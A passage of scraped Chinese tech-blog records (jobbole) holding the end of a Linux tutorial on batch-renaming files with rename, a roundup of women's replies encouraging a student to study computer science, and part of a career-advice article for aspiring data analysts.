class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac157c667605066-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac157c667605066-5\"><span class=\"crayon-e\">agenda </span><span class=\"crayon-e\">notes </span><span class=\"crayon-i\">weekly</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac157c667605066-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>现在让我们想象一下，你改变了心意，并希望把这些扩展名改回来。没问题。只需修改命令。窍门是理解第一个斜杠前的 <code>s</code> 意味着“替代”。前两个斜线之间的内容是我们想要改变的东西，第二个斜线和第三个斜线之间是改变后的东西。所以，<code>$</code> 表示文件名的结尾，我们将它改为 <code>.txt</code>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a753ac157f036653817\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls\r\nagenda notes weekly\r\n$ rename 's/$/.txt/' *\r\n$ ls\r\nagenda.txt notes.txt weekly.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac157f036653817-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac157f036653817-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac157f036653817-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac157f036653817-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac157f036653817-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac157f036653817-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a753ac157f036653817-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac157f036653817-2\"><span class=\"crayon-e\">agenda </span><span class=\"crayon-e\">notes </span><span class=\"crayon-i\">weekly</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac157f036653817-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">rename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/$/.txt/'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac157f036653817-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac157f036653817-5\"><span class=\"crayon-v\">agenda</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">notes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">weekly</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac157f036653817-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>你也可以更改文件名的其他部分。牢记 <code>s/旧内容/新内容/</code> 规则。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a753ac1582642804628\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls\r\ndraft-minutes-2018-03 draft-minutes-2018-04 draft-minutes-2018-05\r\n$ rename 's/draft/approved/' *minutes*\r\n$ ls\r\napproved-minutes-2018-03 approved-minutes-2018-04 approved-minutes-2018-05\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1582642804628-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1582642804628-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1582642804628-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1582642804628-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1582642804628-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1582642804628-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a753ac1582642804628-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1582642804628-2\"><span class=\"crayon-v\">draft</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">draft</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">04</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">draft</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">05</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac1582642804628-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">rename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/draft/approved/'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-e \">minutes*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1582642804628-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac1582642804628-5\"><span class=\"crayon-v\">approved</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">approved</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">04</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">approved</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">05</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1582642804628-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>在上面的例子中注意到，当我们在 <code>s/old/new/</code> 中使用 <code>s</code> 时，我们用另一个名称替换名称的一部分。当我们使用 <code>y</code> 时，我们就是直译（将字符从一个范围替换为另一个范围）。</p>\n<h3 id=\"toc_2\">总结</h3>\n<p>现在有很多复制和重命名文件的方法。我希望其中的一些会让你在使用命令行时更愉快。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114148\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114148votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114148\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114148/", "url_obj_id": "4c1a5cd279328306ee9d94cacae94409"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/cebf98169b4fd1e38a35c3537129ceaa.jpg"], "title": "计算机专业太难不适合女生学？来看 N 多小姐姐的回应", "create_date": "2018/06/22 ·", "praise_num": 1, "fav_num": 1, "comment_num": 3, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/aoi\">伯小乐</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>高考结束了，填志愿选专业的时候也要来了。最近我们微博收到一个私信求助：</p>\n<p><img class=\"alignnone\" src=\"https://wx2.sinaimg.cn/mw690/7cc829d3gy1fsj78ysbugj20f9051gmi.jpg\" width=\"549\" height=\"181\"></p>\n<blockquote><p><a href=\"https://weibo.com/2093492691/GmruxxXrK\" target=\"_blank\">https://weibo.com/2093492691/GmruxxXrK</a></p></blockquote>\n<p>在<a href=\"http://www.jobbole.com/members/weibo_2093492691\">@程序员的那些事</a> 微博发布后，有位小姐姐还感叹：</p>\n<blockquote><p>@刘不刘二小姐：没想到“计算机太难不适合女生学”的观点五年前我上大学的时候有，现在都火成这样了还有[二哈]</p></blockquote>\n<p>很多关注我们的小姐姐都冒泡留言，鼓励那位求助的女生。汇总如下：</p>\n<blockquote><p>@澈海情深：计算机女生出来说一句，现在干啥都挺难的。学计算机也没有想象中那么恐怖。感兴趣就学呗。</p>\n<p>@眠眠阿卷：选吧，学计算机又不是以后当码农，计算机是个工具，你学了计算机，以后去哪里再读其他专业都受欢迎</p>\n<p>@J家蠢萌痴汉夏：怎么会，我就毕业了呀，毕业还是简单的，只要好好听课，也不会挂科的[二哈] 当年高考结束填志愿，五个全是计算机第一顺位，🙊回过头想想也是有勇气啊</p>\n<p>@凃小斐：老子就是女孩子，毕业的时候专业第一的成绩保送985研究生，谁跟你说女孩子不适合学计算机的出来我打死他</p>\n<p>@于梦杰呀：计算机系女生表示难确实是难，有时还会感觉痛苦，但是只要你好好学肯定是能学好的</p>\n<p>@enchantereyes：喜欢就选。首先再菜毕业也不会难，另外学一行跟干一行是两码事。难得有想学的东西，不试试不会不甘心吗？</p>\n<p>@geekInfo：我也是计算机出来的女生。最初的专业是应用数学选修经济，学了一学期不开心反而喜欢计算机课就转了专业。读大学之前一点编程基础也没有，也不就这么顺利研究生毕业了。毕业成绩年级第二，文凭还没到手就被公司定下来了，到现在一直很喜欢这职业，庆幸当初转了专业，要学自己感兴趣的。</p>\n<p>@月光少爷金：时代不一样了，女程序猿不知道多受欢迎。况且，不学计算机，学统计将来做策略也不错呀</p>\n<p>@芒果很忙busybusy：学吧，入门没有想象中那么难的，我就是程序媛，IT公司女生少，环境相对比较单纯，是非也少，女生挺受宠的</p>\n<p>@茶杯茶茶茶：计算机有脑子的都能学，很好学的，相比于其他的专业，至少很多东西可以直接上手及时反馈，网上教程一大堆，只有计算机方面的可以。</p>\n<p>@翡翠梦境里睡觉的猫：有兴趣就可以选，当年报志愿之前也有人再三强调学计算机累（倒是没说女生不适合，现在想来在当时已经难得），然而我高中学了一点编程觉得有趣，于是选了，于是一路计算机好多年仍然觉得很有趣</p></blockquote>\n<p>其他几个男生的留言：</p>\n<blockquote><p>@MSP-GawainAntarx：难的不是计算机科学，而且怎么让自己抛弃“女生不适合学计算机”的刻板印象</p>\n<p>@mtedrrqcmws2017：1. 年轻女程序员在应聘过程中不但不会被歧视，反而会被有所偏袒，因为公司（尤其是大公司）普遍男生太多，需要女生来平衡工作环境。2. 现代编程语言已经被高度抽象，脱离硬件，倒更加靠近“技术设计”，入门并非男式，比如前端，手机app等。</p></blockquote>\n<p>如果以后还有人和你说「计算机专业不适合女生」之类的，可以把本文发给他们看，让他们看看 IT 行业小姐姐们是如何说的。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114141\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114141votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114141\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">伯小乐</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/11/f2bb4f6f428a49476a2e91c355c8d150.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            伯乐在线小编一枚~~~~PS：我不是@小编辑，不要问我了        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/aoi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/aoi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/aoi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 263</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,程序员,计算机专业", "url": "http://blog.jobbole.com/114141/", "url_obj_id": "a994858569521b3cc4c7ef650140ad3c"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/03b5b99cd8b93d7c062277c5de23570b.jpg"], "title": "听说你立志要做数据分析，不如先听听老司机的建议？", "create_date": "2018/06/25 ·", "praise_num": 4, "fav_num": 5, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://mp.weixin.qq.com/s?__biz=MzU0Mzg4NDI4Mw==&amp;mid=2247483656&amp;idx=1&amp;sn=9ed81ce065f053272f4ac9631c0024ae&amp;chksm=fb05d79ccc725e8a4d9e13aa6a1d3cb49d74149966b1f42c68142b86a76d764c4a91accd908b#rd\">作者 JerryHuang 推荐</a>   </div><p>每年总有很多人，怀揣着对世界的一知半解、满腔似火的热情、还有对美好生活的向往，走出象牙塔，投身社会。</p>\n<p>世界很大，诱惑很多。对于未来，甚至在工作多年后，他们仍然没有清晰的方向，或者缺乏独立、深度的思考。</p>\n<p>方向很重要，而人生很短暂。往哪里走，怎么走，再怎么也得花点时间思考一下，不是吗？</p>\n<p>如果你决心要在数据科学领域有所作为，或者立志做数据分析，这篇文章提了点小建议，希望对你有所帮助。</p>\n<h3>一、去大厂还是去小厂？</h3>\n<p>我们做每件事之前，都要先明确做这件事的目的和意义是什么。</p>\n<p>先来问问自己，做数据分析的目的和价值是什么？我的理解是，致力于用数据帮助企业解决业务问题，辅助业务决策。</p>\n<p>关于这个问题，你可以花3-5年时间来思考和领悟，不急，但需要想清楚。</p>\n<p>你还面临一个抉择，到底是去大厂还是去小厂？</p>\n<p>之前接到很多猎头电话，不少都会问：“你是做分析还是做挖掘的呀？”刚开始，也常会和猎头在电话里“理论”一番。后来在大厂待过才明白，大厂分工比较细，分析是偏向经营分析，即取数分析写报告，而挖掘则是建模调参部署等。小厂就不一样了，谈需求、确定思路、指标设计、平台搭建、接入数据、处理数据、建立宽表、模型训练、结果分析、撰写报告、模型部署、报表计算、数据可视化等一整个流程，一个人几乎都可能会参与。</p>\n<p>如果有机会，请一定要去大厂历练几年！大厂大多都很开放，常常敢为天下先，敢于引入一些新的东西，包括技术、思维、制度，技术比较先进，优秀的人也很多。大厂的管理制度也很完善，福利待遇当然会更好些。大厂的数据规模绝对够大，而且应用场景也多，可施展的空间应该会比较大。所以，抱着学习的态度在大厂里混几年，是可以成长很快的。（有好，当然也有不好）大厂流程繁杂，整体效率偏低，提一个取数申请可能需要1-2周。大厂的内部竞争也大，存在于不同项目团队，也存在于同一部门不同成员之间。大项目资源投入大，小项目资源申请很困难，重视程度也不一样。最主要的，大厂分工很明细，不同职位的轮换似乎不大容易，从入职到几年后离开一直做经营分析都是有可能的，容易导致能力的单一，不利于个人综合素质的培养。</p>\n<p>相比之下，小厂就灵活多了，人和事都不会很复杂，而且效率也高。小厂可能会优先考虑做这件事情的投入和产出，即看应用效果。（大厂反而愿意给资源去试，短期内不怎么关注投入产出。）所以，在小厂工作，既要学会帮公司赚钱，也要学会帮公司省钱。小厂分工不会很细，大多需要一个人做多种工作。所以，小厂里面的程序员常常身怀多技。但小厂数据规模小，技术实力较弱，团队成员整体素质不高，而且项目流程不大规范，常常怎么简单怎么来，怎么高效怎么来。有些小公司的码农，除了对外发过一两封邮件，平时的沟通几乎是在QQ里，结果待了几年之后连写一封邮件都不会。有些小厂自己没有数据，重要是作为乙方给大企业做项目，这种模式常常受甲方牵制，可发挥的空间很小，而且一个项目周期往往比想象中要长（我本人之前就厌倦做乙方），因此不大建议去这样的公司。</p>\n<p>不管大厂还是小厂，在选择时，建议都要看看所要加入的团队。</p>\n<p>综合来说，建议先去大厂混几年，再去小厂找个Title高点的职位发挥自己所长。</p>\n<p>再来说几句，什么场景下分析，什么场景下挖掘呢？</p>\n<p>分析其实是一个很笼统的概念。把当前营业额跟去年同期做对比发现增长了不少，这个也可以认为是分析。分析是从数据中发现问题或规律，并提出合理的建议。分析常常伴随着要写报告，进而要给业务方汇报分析结果。最好是给决策层汇报，因为决策层有拍板的权力，而且对数据结果的感知和可能的应用有自己独到的认知。</p>\n<p>如果需要把分析的结果固化下来，定期输出结果，提供给业务方，这个时候就需要开发数据产品了。</p>\n<p>挖掘是用算法解决某个具体的复杂问题，用常规分析方法解决不了的，如客户流失预警、商品最优推荐组合、最有投递路线规划等。</p>\n<p>所以，我一般认为，分析是从数据中发现问题或规律，而挖掘是其中的一块。</p>\n<p><em><img id=\"pic\" class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fsn7ra4wg5j20tz0gln6j.jpg\"></em></p>\n<p style=\"text-align: center;\"><em>数据技能知识一览</em></p>\n<h3>二、1-3年，“所见即所得”，打磨基础技术</h3>\n<p>在职业生涯的初期，请牢记，“所见即所得，所感即所知，多见即多得，多感即多知”。</p>\n<p>不管在大厂还是在小厂，一定要参与到实际项目当中，好好打磨自己的技术。不管是大项目还是小项目，一定要借助来之不易的机会，以极致的工匠精神修炼自身。</p>\n<p>你最好能从基础数据处理做起。只有这样，你才能早点知道，数据并不像在学校里做实验用到的数据那样“好”，它可能看起来“又脏又乱”。只有这样，你才能早点知道，给你取数的那个程序员是如何花了2-3天甚至一周时间才把数算好。</p>\n<p>如果你精通SQL，那就太好了，这样就可以直接能够在数据平台查看原始的数据了。</p>\n<p>最好要看一看最原始的数据长什么样。你不一定能一下子理解这些数据，但你可以慢慢地感受它们，因为它们所投射出来的是最真实的业务场景。</p>\n<p>举个例子吧，原始的会员注册信息数据里面，性别一般填“男”、“男性”、“女”、“女性”、“未知”、“其它”等值，但处理好之后的二手数据里面，性别就变成了“男”、“女”、“未知”等三个值了。仅看这三个值，可能会漏掉一些业务场景，填“男”可能是从移动端输入时选择的，填“男性”则可能是手工填写注册表格时勾选上的。而漏掉的这个场景，说不定就是所要找的那个分析点。</p>\n<p> </p>\n<p>你最好还能熟练掌握一两门编程语言，比如当下流行的Python，作为入行的基础技能。（顺便说一下，码农界普遍认为只会SQL的不算真正的程序员~~）</p>\n<p>当今时代，编程已经从娃娃开始抓起。早在5年前，英国规定5岁以上儿童必须学习编程课，法国将编程列入初等教育选修课程，美国已有40个州制定政策支持计算机科学，有35个州将计算机科学课程纳入高中毕业学分体系。美国前总统奥巴马就曾在全美发起“编程一小时”的运动，旨在让全美小学生开始学习编程。2017年，浙江、北京、山东等省确定要把Python编程基础纳入信息技术课程和高考的内容体系。编程将是一项很基础的技能，也将是承接其他知识的基石。在未来，会编程很可能跟使用智能手机一样普遍。</p>\n<p>当处理基础数据的时候，必然会在数据库或数据平台上进行。你可能需要对这些存储数据的环境加以了解，如传统的结构化数据库Oracle、Mysql、DB2等，又如当下流行的Nosql数据库HBase、Redis、MongoDB、Cassandra等，再如大数据集群平台、原理及其相关概念，类似Hadoop、Hive、Hue、MapReduce、Spark、Scala、Sqoop、Pig、Zookeeper、Flume、Oozie等。你或者也需要了解数据传输的工具，如DataStage、Kafka、Sqoop等。你甚至也可能被安排做安装系统、部署软件、配置环境、同步数据等一些琐碎的工作。</p>\n<p>关于这些，如果你非常感兴趣，可以考虑往大数据平台方向发展，成为数据开发工程师、数据平台运维工程师、或者数据平台架构师。</p>\n<p>你不必理解太深，可仅仅停留在了解层面，但知道这些知识会让你和数据开发工程师、运维工程师和平台架构师沟通起来顺畅很多。</p>\n<p>当处理和分析数据时，有些关于数据的操作是必然需要掌握的。首先是常见格式的数据导入导出，如TXT、CSV、XLS，然后是主要的数据加工技巧，包括建表/视图、插入、更新、查询、并联、串联、汇总、排序、格式转换、循环、常用的函数、描述统计量、变量，等等。</p>\n<p>这些操作很基础，但不简单。你可能经常会遇到各种情况，如花了一个下午时间就是没能把一个很小的CSV数据文件正确地导入到数据库中，不是乱码就是错位，或者两表关联时老是报一些烦人的错误，或者日期字段进行格式转换时出现空值……反正状况百出，防不胜防。</p>\n<p>关于这些基础操作，需要不断积累经验，尽量能够做到在不同场景下快速高效地完成，轻松应付。</p>\n<p>如果有人已经给你取好了数，而你的工作是分析数据写报告，那么分析技巧首先是你需要培养起来的。对拿到的数据，要时刻保持疑问，不能太乐观，因为别人算好的数据未必完全是你想要的数据，又或者数据质量并不是你想的那样好。</p>\n<p>在分析之前，需要进行数据探索，看看数据质量如何。比如，你需要清楚有多少数据量，有什么信息，可衍生什么指标，缺失情况如何，如何填补缺失值，值的分布情况如何，如何处理极值，名义/字符变量是否需要转换，等等。</p>\n<p>分析时，要清楚指标不同形态的含义，如绝对值、占比、同比、趋势、均值、标准差，等等。</p>\n<p>在这里，我想指出，数据有对比才有意义。如果一个穷人捡到100元，他会很高兴，这够他吃好几天了。但如果让一个富人去捡100元，那感觉就不一样了，他可能觉得他不值得这么做，因为用弯腰去捡的时间挣到的钱远远不止这么多。</p>\n<p>统计学知识是必须要掌握的，这是基础。如果你非数学或统计学专业出身，那么请自学。</p>\n<p>另外，也请你一定要掌握主流算法的原理，比如线性回归、逻辑回归、决策树、神经网络、关联分析、聚类、协同过滤、随机森林，再深入一点，还可以掌握文本分析、深度学习、图像识别等相关的算法。</p>\n<p>关于这些算法，不仅需要了解其原理，你最好可以流畅地阐述出来，还需要你知晓其在各行业的一些应用场景。</p>\n<p>关于这些算法，你最好能够参与关于模型开发的具体项目实践。那样的话，你就可以清楚关于建模的大概流程是怎么样的，不同算法在建模中有不同，需要注意哪些地方。</p>\n<p>如果你打字速度不快，那也最好重视起来，这虽然是一个不痛不痒的问题，但也在较大程度上影响你的工作效率，进而影响到你的工作产出，当然也可能因此会影响到你的薪资哦！</p>\n<p>另外，还有一些提高工作效率的小技巧，也可以多学多掌握。例如，一些电脑的快捷键，定期保存文件，文件的归类存放和快速查找，等等。</p>\n<p>作为职场新人，你不仅需要打磨技术，纯技术之外的技能也需要不断修炼。</p>\n<p>职场的做